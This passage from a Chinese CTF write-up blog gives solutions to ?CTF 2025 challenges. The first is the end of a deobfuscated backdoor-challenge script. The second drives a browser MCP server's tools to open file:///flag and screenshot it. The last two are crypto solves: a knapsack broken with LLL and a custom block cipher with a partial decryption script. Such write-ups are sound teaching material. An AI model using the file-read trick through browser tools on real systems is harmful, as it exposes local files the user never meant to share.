class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>)]</span><br><span class="line">    IllIlII = [llIIIl(IllI, lIllIll) <span class="keyword">for</span> IllI <span class="keyword">in</span> lIIIlI]</span><br><span class="line">    lIlllIl = <span class="string">b&#x27;&#x27;</span>.join(x.to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>) + y.to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>) <span class="keyword">for</span> x, y <span class="keyword">in</span> IllIlII)</span><br><span class="line">    <span class="keyword">return</span> lIlllIl.rstrip(<span class="string">b&#x27;\0&#x27;</span>).decode()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">IlIlIl</span>():</span><br><span class="line">    lIIlI = <span class="string">&#x27;2311b9123d7fdb3abe4b29b2efd34ed140e4ad78428b5d283a3e75af4be3ff2267f1db8523383ad0&#x27;</span></span><br><span class="line">    lIIIllI = <span class="string">&quot;dhcowjqnckssqdqm&quot;</span></span><br><span class="line">    lIlIl = lllIIl(lIIlI, lIIIllI)</span><br><span class="line">    <span class="built_in">print</span>(lIlIl)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">IlIlIl()</span><br><span class="line"><span class="comment"># flag&#123;b4ckd00r_4ct1v4ted_3xfiltr4t10n&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Week3-browser-mcp"><a href="#Week3-browser-mcp" class="headerlink" title="[Week3] browser-mcp"></a>[Week3] browser-mcp</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --rm --network host -p 6274:6274 -p 6277:6277 ghcr.io/modelcontextprotocol/inspector:latest</span><br></pre></td></tr></table></figure>

<p>调用工具，先调用browser_start，接着调用browser_create_page，接着调用browser_navigate访问file:&#x2F;&#x2F;&#x2F;flag，最后调用browser_screenshot获取页面截图</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week3&week4_WP/image-20251024104355585.png" alt="image-20251024104355585"></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Week3-BackPack"><a href="#Week3-BackPack" class="headerlink" title="[Week3] BackPack"></a>[Week3] BackPack</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&#x27;flag&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">18</span></span><br><span class="line"></span><br><span class="line">nbits = <span class="number">100</span></span><br><span class="line">a = [random.randint(<span class="number">1</span>&lt;&lt;(nbits-<span class="number">1</span>),<span class="number">1</span>&lt;&lt;nbits) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag))]</span><br><span class="line">b = <span class="built_in">sum</span>([i*j <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(a,flag)])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;a = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;b = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">a = [860821557828281442941778166659, 803777501490125576839352944446, 1005791873983601117392247346085, 1231852467297005050375360025752, 1150352241055815801801169950798, 1033631711572423166071966000805, 890177812727691819583920502722, 774328120543962049661717901714, 1245456973890441414472116526495, 1028358564218716011754082665529, 1255301095911246652616865738235, 1044268314210406252404807758214, 657259442956498113250060870571, 1012336650574893000661389761761, 634657308746918412136962502475, 777627386546123162588057785533, 678975824788168905519513549577, 1019837548122056307083044320710]</span></span><br><span class="line"><span class="string">b = 1379609132427499161538242425117756</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>背包密码，剪去flag的头和尾，再LLL即可求出flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">860821557828281442941778166659</span>, <span class="number">803777501490125576839352944446</span>, <span class="number">1005791873983601117392247346085</span>, <span class="number">1231852467297005050375360025752</span>, <span class="number">1150352241055815801801169950798</span>, <span class="number">1033631711572423166071966000805</span>, <span class="number">890177812727691819583920502722</span>, <span class="number">774328120543962049661717901714</span>, <span class="number">1245456973890441414472116526495</span>, <span class="number">1028358564218716011754082665529</span>, <span class="number">1255301095911246652616865738235</span>, <span class="number">1044268314210406252404807758214</span>, <span class="number">657259442956498113250060870571</span>, <span class="number">1012336650574893000661389761761</span>, <span class="number">634657308746918412136962502475</span>, <span class="number">777627386546123162588057785533</span>, <span class="number">678975824788168905519513549577</span>, <span class="number">1019837548122056307083044320710</span>]</span><br><span class="line">b = <span class="number">1379609132427499161538242425117756</span></span><br><span class="line"></span><br><span class="line">tmp = <span class="string">b&#x27;flag&#123;&#x27;</span></span><br><span class="line">b_tmp = <span class="built_in">sum</span>([i*j <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(a,tmp)])</span><br><span class="line"></span><br><span class="line">pk = a[<span class="number">5</span>:-<span class="number">1</span>]</span><br><span class="line">cipher = b - b_tmp - (a[-<span class="number">1</span>]*<span class="built_in">ord</span>(<span class="string">b&#x27;&#125;&#x27;</span>))</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(pk)</span><br><span class="line">Ge = Matrix(ZZ,n+<span class="number">1</span>,n+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    Ge[i,i] = <span class="number">1</span></span><br><span class="line">    Ge[i,-<span class="number">1</span>] = pk[i]</span><br><span class="line">Ge[-<span class="number">1</span>,-<span class="number">1</span>] = cipher</span><br><span class="line">Ge[:,-<span class="number">1</span>] *= <span class="number">2</span>**<span class="number">1000</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> Ge.LLL():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">all</span>(<span class="number">0</span> &lt;= <span class="built_in">abs</span>(x) &lt;= <span class="number">255</span> <span class="keyword">for</span> x <span class="keyword">in</span> line[:-<span class="number">1</span>]):</span><br><span class="line">        flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> line[:-<span class="number">1</span>]:</span><br><span class="line">            flag += <span class="built_in">bytes</span>([<span class="built_in">abs</span>(i)])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;flag&#123;&#123;<span class="subst">&#123;flag.decode()&#125;</span>&#125;&#125;&quot;</span>)</span><br><span class="line">        <span class="comment"># flag&#123;342y_14771C3&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Week3-Great-Block-Cipher"><a href="#Week3-Great-Block-Cipher" class="headerlink" title="[Week3] Great Block Cipher"></a>[Week3] Great Block Cipher</h2><p>源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg, key, iv</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(msg) % <span class="number">16</span> == <span class="number">0</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(key) == <span class="number">16</span> <span class="keyword">and</span> <span class="built_in">len</span>(iv) == <span class="number">16</span></span><br><span class="line">    xor = <span class="keyword">lambda</span> a, b:[i^j <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(a,b)]</span><br><span class="line">    sbox = [<span class="number">75</span>, <span class="number">203</span>, <span class="number">236</span>, <span class="number">186</span>, <span class="number">19</span>, <span class="number">102</span>, <span class="number">179</span>, <span class="number">172</span>, <span class="number">92</span>, <span class="number">254</span>, <span class="number">54</span>, <span class="number">41</span>, <span class="number">124</span>, <span class="number">49</span>, <span class="number">195</span>, <span class="number">32</span>, <span class="number">191</span>, <span class="number">103</span>, <span class="number">157</span>, <span class="number">2</span>, <span class="number">128</span>, <span class="number">3</span>, <span class="number">156</span>, <span class="number">58</span>, <span class="number">159</span>, <span class="number">169</span>, <span class="number">189</span>, <span class="number">71</span>, <span class="number">168</span>, <span class="number">127</span>, <span class="number">109</span>, <span class="number">18</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">40</span>, <span class="number">164</span>, <span class="number">192</span>, <span class="number">182</span>, <span class="number">181</span>, <span class="number">14</span>, <span class="number">204</span>, <span class="number">56</span>, <span class="number">226</span>, <span class="number">43</span>, <span class="number">206</span>, <span class="number">74</span>, <span class="number">129</span>, <span class="number">248</span>, <span class="number">11</span>, <span class="number">53</span>, <span class="number">72</span>, <span class="number">210</span>, <span class="number">33</span>, <span class="number">215</span>, <span class="number">250</span>, <span class="number">91</span>, <span class="number">161</span>, <span class="number">183</span>, <span class="number">239</span>, <span class="number">143</span>, <span class="number">167</span>, <span class="number">63</span>, <span class="number">152</span>, <span class="number">126</span>, <span class="number">48</span>, <span class="number">84</span>, <span class="number">146</span>, <span class="number">76</span>, <span class="number">234</span>, <span class="number">180</span>, <span class="number">107</span>, <span class="number">227</span>, <span class="number">142</span>, <span class="number">65</span>, <span class="number">147</span>, <span class="number">209</span>, <span class="number">89</span>, <span class="number">188</span>, <span class="number">225</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">24</span>, <span class="number">150</span>, <span class="number">216</span>, <span class="number">45</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">135</span>, <span class="number">36</span>, <span class="number">101</span>, <span class="number">138</span>, <span class="number">199</span>, <span class="number">69</span>, <span class="number">55</span>, <span class="number">86</span>, <span class="number">241</span>, <span class="number">59</span>, <span class="number">16</span>, <span class="number">83</span>, <span class="number">114</span>, <span class="number">39</span>, <span class="number">200</span>, <span class="number">151</span>, <span class="number">125</span>, <span class="number">8</span>, <span class="number">177</span>, <span class="number">198</span>, <span class="number">145</span>, <span class="number">247</span>, <span class="number">237</span>, <span class="number">171</span>, <span class="number">21</span>, <span class="number">136</span>, <span class="number">184</span>, <span class="number">185</span>, <span class="number">117</span>, <span class="number">242</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">174</span>, <span class="number">28</span>, <span class="number">96</span>, <span class="number">246</span>, <span class="number">131</span>, <span class="number">10</span>, <span class="number">231</span>, <span class="number">130</span>, <span class="number">46</span>, <span class="number">104</span>, <span class="number">208</span>, <span class="number">38</span>, <span class="number">187</span>, <span class="number">218</span>, <span class="number">122</span>, <span class="number">139</span>, <span class="number">80</span>, <span class="number">79</span>, <span class="number">235</span>, <span class="number">64</span>, <span class="number">47</span>, <span class="number">238</span>, <span class="number">99</span>, <span class="number">140</span>, <span class="number">163</span>, <span class="number">90</span>, <span class="number">30</span>, <span class="number">252</span>, <span class="number">93</span>, <span class="number">173</span>, <span class="number">31</span>, <span class="number">249</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">155</span>, <span class="number">230</span>, <span class="number">42</span>, <span class="number">82</span>, <span class="number">205</span>, <span class="number">57</span>, <span class="number">148</span>, <span class="number">240</span>, <span class="number">133</span>, <span class="number">0</span>, <span class="number">178</span>, <span class="number">165</span>, <span class="number">17</span>, <span class="number">213</span>, <span class="number">20</span>, <span class="number">222</span>, <span class="number">50</span>, <span class="number">221</span>, <span class="number">97</span>, <span class="number">137</span>, <span class="number">176</span>, <span class="number">243</span>, <span class="number">25</span>, <span class="number">113</span>, <span class="number">175</span>, <span class="number">220</span>, <span class="number">224</span>, <span class="number">118</span>, <span class="number">12</span>, <span class="number">166</span>, <span class="number">141</span>, <span class="number">202</span>, <span class="number">51</span>, <span class="number">61</span>, <span class="number">193</span>, <span class="number">158</span>, <span class="number">245</span>, <span class="number">134</span>, <span class="number">123</span>, <span class="number">211</span>, <span class="number">196</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">244</span>, <span class="number">253</span>, <span class="number">22</span>, <span class="number">108</span>, <span class="number">201</span>, <span class="number">223</span>, <span class="number">73</span>, <span class="number">228</span>, <span class="number">212</span>, <span class="number">27</span>, <span class="number">78</span>, <span class="number">60</span>, <span class="number">153</span>, <span class="number">207</span>, <span class="number">219</span>, <span class="number">85</span>, <span class="number">88</span>, <span class="number">197</span>, <span class="number">121</span>, <span class="number">120</span>, <span class="number">70</span>, <span class="number">6</span>, <span class="number">233</span>, <span class="number">162</span>, <span class="number">105</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">229</span>, <span class="number">214</span>, <span class="number">81</span>, <span class="number">23</span>, <span class="number">44</span>, <span class="number">13</span>, <span class="number">67</span>, <span class="number">15</span>, <span class="number">98</span>, <span class="number">37</span>, <span class="number">170</span>, <span class="number">149</span>, <span class="number">62</span>, <span class="number">132</span>, <span class="number">190</span>, <span class="number">251</span>, <span class="number">34</span>, <span class="number">217</span>, <span class="number">87</span>, <span class="number">29</span>, <span class="number">35</span>, <span class="number">68</span>, <span class="number">194</span>, <span class="number">5</span>, <span class="number">255</span>, <span class="number">52</span>, <span class="number">160</span>, <span class="number">66</span>, <span class="number">94</span>, <span class="number">26</span>, <span class="number">154</span>, <span class="number">77</span>, <span class="number">106</span>]</span><br><span class="line">    cipher = []</span><br><span class="line">    ks = [key[:<span class="number">4</span>],key[<span class="number">4</span>:<span class="number">8</span>],key[<span class="number">8</span>:<span class="number">12</span>],key[<span class="number">12</span>:]]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>*<span class="number">4</span>):</span><br><span class="line">        nk = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            nk = <span class="built_in">int</span>.from_bytes(ks[i+j],<span class="string">&#x27;big&#x27;</span>) ^ (<span class="number">3377808869</span> * nk % (<span class="number">1</span>&lt;&lt;<span class="number">32</span>))</span><br><span class="line">        ks.append(nk.to_bytes(<span class="number">4</span>,<span class="string">&#x27;little&#x27;</span>))</span><br><span class="line">    block_count = <span class="built_in">len</span>(msg)//<span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> <span class="built_in">range</span>(block_count):</span><br><span class="line">        m = <span class="built_in">list</span>(msg[<span class="number">16</span>*block:<span class="number">16</span>*(block+<span class="number">1</span>)])</span><br><span class="line">        m = xor(m, iv)</span><br><span class="line">        m = xor(m, <span class="string">b&#x27;&#x27;</span>.join(ks[:<span class="number">4</span>]))</span><br><span class="line">        <span class="keyword">for</span> loop <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            m = [sbox[i] <span class="keyword">for</span> i <span class="keyword">in</span> m]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                a = <span class="built_in">bin</span>(<span class="built_in">sum</span>([m[<span class="number">4</span>*i+j]*<span class="number">256</span>**j <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]))[<span class="number">2</span>:].zfill(<span class="number">32</span>)</span><br><span class="line">                b = []</span><br><span class="line">                d = i+<span class="number">3</span></span><br><span class="line">                c1, c2 = <span class="number">32</span>//d, <span class="number">32</span>%d</span><br><span class="line">                k = <span class="number">0</span></span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(d):</span><br><span class="line">                    <span class="keyword">if</span> j &lt; c2:</span><br><span class="line">                        b.append(a[k:k+c1+<span class="number">1</span>])</span><br><span class="line">                        k += c1+<span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        b.append(a[k:k+c1])</span><br><span class="line">                        k += c1</span><br><span class="line">                c = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(c1+<span class="number">1</span>):</span><br><span class="line">                    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(d):</span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">len</span>(b[k]) &gt; j:</span><br><span class="line">                            c += b[k][j]</span><br><span class="line">                m[<span class="number">4</span>*i],m[<span class="number">4</span>*i+<span class="number">1</span>],m[<span class="number">4</span>*i+<span class="number">2</span>],m[<span class="number">4</span>*i+<span class="number">3</span>] = <span class="built_in">int</span>(c,<span class="number">2</span>).to_bytes(<span class="number">4</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> loop &lt; <span class="number">15</span>:</span><br><span class="line">                a = []</span><br><span class="line">                b = [<span class="number">10</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                        a.append(<span class="built_in">sum</span>([b[<span class="number">4</span>*i+k]*m[j+<span class="number">4</span>*k] <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)])%<span class="number">256</span>)</span><br><span class="line">                m = a</span><br><span class="line">            m = xor(m, <span class="string">b&#x27;&#x27;</span>.join(ks[<span class="number">4</span>*(loop+<span class="number">1</span>):<span class="number">4</span>*(loop+<span class="number">2</span>)]))</span><br><span class="line">        cipher.append(<span class="built_in">bytes</span>(m))</span><br><span class="line">        iv = m</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>.join(cipher)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">msg</span>):</span><br><span class="line">    l = (<span class="built_in">len</span>(msg)//<span class="number">16</span>+<span class="number">1</span>)*<span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> msg.ljust(l,<span class="built_in">chr</span>(l-<span class="built_in">len</span>(msg)).encode())</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;*********&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">what = <span class="string">b&#x27;www.bilibili.com/video/BV1ox4y1e71S&#x27;</span></span><br><span class="line">key, iv = what[:<span class="number">16</span>], what[-<span class="number">16</span>:]</span><br><span class="line">cipher = encrypt(pad(flag), key, iv)</span><br><span class="line"><span class="built_in">print</span>(cipher.<span class="built_in">hex</span>())</span><br><span class="line"><span class="comment"># aa624dc4a26a879cbdc61585e1c92650d5d84c9195508d73172008e3bf1cf6edfa5eb1d1590b0de1424a563c91aeb5d8</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>类似AES的加密，AI秒了（</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week3&week4_WP/image-20251024115647576.png" alt="image-20251024115647576"></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Decryption script for the provided custom cipher</span></span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_bytes</span>(<span class="params">a: <span class="built_in">bytes</span>, b: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b))</span><br><span class="line"></span><br><span class="line">sbox = [<span class="number">75</span>,<span class="number">203</span>,<span class="number">236</span>,<span class="number">186</span>,<span class="number">19</span>,<span class="number">102</span>,<span class="number">179</span>,<span class="number">172</span>,<span class="number">92</span>,<span class="number">254</span>,<span class="number">54</span>,<span class="number">41</span>,<span class="number">124</span>,<span class="number">49</span>,<span class="number">195</span>,<span class="number">32</span>,<span class="number">191</span>,<span class="number">103</span>,<span class="number">157</span>,<span class="number">2</span>,<span class="number">128</span>,<span class="number">3</span>,<span class="number">156</span>,<span class="number">58</span>,<span class="number">159</span>,<span class="number">169</span>,<span class="number">189</span>,<span class="number">71</span>,<span class="number">168</span>,<span class="number">127</span>,<span class="number">109</span>,<span class="number">18</span>,<span class="number">232</span>,<span class="number">144</span>,<span class="number">40</span>,<span class="number">164</span>,<span class="number">192</span>,<span class="number">182</span>,<span class="number">181</span>,<span class="number">14</span>,<span class="number">204</span>,<span class="number">56</span>,<span class="number">226</span>,<span class="number">43</span>,<span class="number">206</span>,<span class="number">74</span>,<span class="number">129</span>,<span class="number">248</span>,<span class="number">11</span>,<span class="number">53</span>,<span class="number">72</span>,<span class="number">210</span>,<span class="number">33</span>,<span class="number">215</span>,<span class="number">250</span>,<span class="number">91</span>,<span class="number">161</span>,<span class="number">183</span>,<span class="number">239</span>,<span class="number">143</span>,<span class="number">167</span>,<span class="number">63</span>,<span class="number">152</span>,<span class="number">126</span>,<span class="number">48</span>,<span class="number">84</span>,<span class="number">146</span>,<span class="number">76</span>,<span class="number">234</span>,<span class="number">180</span>,<span class="number">107</span>,<span class="number">227</span>,<span class="number">142</span>,<span class="number">65</span>,<span class="number">147</span>,<span class="number">209</span>,<span class="number">89</span>,<span class="number">188</span>,<span class="number">225</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">24</span>,<span class="number">150</span>,<span class="number">216</span>,<span class="number">45</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">135</span>,<span class="number">36</span>,<span class="number">101</span>,<span class="number">138</span>,<span class="number">199</span>,<span class="number">69</span>,<span class="number">55</span>,<span class="number">86</span>,<span class="number">241</span>,<span class="number">59</span>,<span class="number">16</span>,<span class="number">83</span>,<span class="number">114</span>,<span class="number">39</span>,<span class="number">200</span>,<span class="number">151</span>,<span class="number">125</span>,<span class="number">8</span>,<span class="number">177</span>,<span class="number">198</span>,<span class="number">145</span>,<span class="number">247</span>,<span class="number">237</span>,<span class="number">171</span>,<span class="number">21</span>,<span class="number">136</span>,<span class="number">184</span>,<span class="number">185</span>,<span class="number">117</span>,<span class="number">242</span>,<span class="number">111</span>,<span class="number">119</span>,<span class="number">174</span>,<span class="number">28</span>,<span class="number">96</span>,<span class="number">246</span>,<span class="number">131</span>,<span class="number">10</span>,<span class="number">231</span>,<span class="number">130</span>,<span class="number">46</span>,<span class="number">104</span>,<span class="number">208</span>,<span class="number">38</span>,<span class="number">187</span>,<span class="number">218</span>,<span class="number">122</span>,<span class="number">139</span>,<span class="number">80</span>,<span class="number">79</span>,<span class="number">235</span>,<span class="number">64</span>,<span class="number">47</span>,<span class="number">238</span>,<span class="number">99</span>,<span class="number">140</span>,<span class="number">163</span>,<span class="number">90</span>,<span class="number">30</span>,<span class="number">252</span>,<span class="number">93</span>,<span class="number">173</span>,<span class="number">31</span>,<span class="number">249</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">155</span>,<span class="number">230</span>,<span class="number">42</span>,<span class="number">82</span>,<span class="number">205</span>,<span class="number">57</span>,<span class="number">148</span>,<span class="number">240</span>,<span class="number">133</span>,<span class="number">0</span>,<span class="number">178</span>,<span class="number">165</span>,<span class="number">17</span>,<span class="number">213</span>,<span class="number">20</span>,<span class="number">222</span>,<span class="number">50</span>,<span class="number">221</span>,<span class="number">97</span>,<span class="number">137</span>,<span class="number">176</span>,<span class="number">243</span>,<span class="number">25</span>,<span class="number">113</span>,<span class="number">175</span>,<span class="number">220</span>,<span class="number">224</span>,<span class="number">118</span>,<span class="number">12</span>,<span class="number">166</span>,<span class="number">141</span>,<span class="number">202</span>,<span class="number">51</span>,<span class="number">61</span>,<span class="number">193</span>,<span class="number">158</span>,<span class="number">245</span>,<span class="number">134</span>,<span class="number">123</span>,<span class="number">211</span>,<span class="number">196</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">244</span>,<span class="number">253</span>,<span class="number">22</span>,<span class="number">108</span>,<span class="number">201</span>,<span class="number">223</span>,<span class="number">73</span>,<span class="number">228</span>,<span class="number">212</span>,<span class="number">27</span>,<span class="number">78</span>,<span class="number">60</span>,<span class="number">153</span>,<span class="number">207</span>,<span class="number">219</span>,<span class="number">85</span>,<span class="number">88</span>,<span class="number">197</span>,<span class="number">121</span>,<span class="number">120</span>,<span class="number">70</span>,<span class="number">6</span>,<span class="number">233</span>,<span class="number">162</span>,<span class="number">105</span>,<span class="number">100</span>,<span class="number">112</span>,<span class="number">229</span>,<span class="number">214</span>,<span class="number">81</span>,<span class="number">23</span>,<span class="number">44</span>,<span class="number">13</span>,<span class="number">67</span>,<span class="number">15</span>,<span class="number">98</span>,<span class="number">37</span>,<span class="number">170</span>,<span class="number">149</span>,<span class="number">62</span>,<span class="number">132</span>,<span class="number">190</span>,<span class="number">251</span>,<span class="number">34</span>,<span class="number">217</span>,<span class="number">87</span>,<span class="number">29</span>,<span class="number">35</span>,<span class="number">68</span>,<span class="number">194</span>,<span class="number">5</span>,<span class="number">255</span>,<span class="number">52</span>,<span class="number">160</span>,<span class="number">66</span>,<span class="number">94</span>,<span class="number">26</span>,<span class="number">154</span>,<span class="number">77</span>,<span class="number">106</span>]</span><br><span class="line">inv_sbox = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> i,v <span class="keyword">in</span> <span class="built_in">enumerate</span>(sbox):</span><br><span class="line">    inv_sbox[v] = i</span><br><span class="line"></span><br><span class="line">b_list = [<span class="number">10</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line">B = [[b_list[<span class="number">4</span>*i+k] <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mat_inv_mod256</span>(<span class="params">mat</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(mat)</span><br><span class="line">    A = [[(mat[i][j]) % <span class="number">256</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)] + [<span class="number">1</span> <span class="keyword">if</span> i==j <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    row = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        pivot = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(row, n):</span><br><span class="line">            <span class="keyword">if</span> gcd(A[r][col], <span class="number">256</span>) == <span class="number">1</span>:</span><br><span class="line">                pivot = r; <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> pivot <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Matrix not invertible modulo 256&quot;</span>)</span><br><span class="line">        A[row], A[pivot] = A[pivot], A[row]</span><br><span class="line">        inv_pivot = <span class="built_in">pow</span>(A[row][col], -<span class="number">1</span>, <span class="number">256</span>)</span><br><span class="line">        A[row] = [(x * inv_pivot) % <span class="number">256</span> <span class="keyword">for</span> x <span class="keyword">in</span> A[row]]</span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            <span class="keyword">if</span> r != row:</span><br><span class="line">                factor = A[r][col]</span><br><span class="line">                <span class="keyword">if</span> factor:</span><br><span class="line">                    A[r] = [(A[r][c] - factor*A[row][c]) % <span class="number">256</span> <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*n)]</span><br><span class="line">        row += <span class="number">1</span></span><br><span class="line">    inv = [[A[i][n + j] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    <span class="keyword">return</span> inv</span><br><span class="line"></span><br><span class="line">B_inv = mat_inv_mod256(B)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bit_perm_inverse_for_i</span>(<span class="params">c_bits, i</span>):</span><br><span class="line">    d = i + <span class="number">3</span></span><br><span class="line">    c1, c2 = <span class="built_in">divmod</span>(<span class="number">32</span>, d)</span><br><span class="line">    lengths = [(c1+<span class="number">1</span>) <span class="keyword">if</span> k 